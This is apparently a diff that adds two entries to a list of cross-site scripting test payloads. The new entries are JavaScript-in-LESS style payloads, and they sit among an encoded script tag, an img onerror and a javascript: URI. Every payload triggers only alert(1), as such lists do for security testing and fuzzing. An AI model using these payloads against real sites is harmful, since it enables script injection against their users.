@@ -163,3 +163,5 @@ javascript:alert(1)
 PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 x”</title><img src%3dx onerror%3dalert(1)>
 [[#%3Cscript%3Ealert(1)%3C/script%3E|
+a{b:`function(){alert(1)}()`;}
+"><style type=text/less>a{b:`function(){alert(1)}()`;}</style>
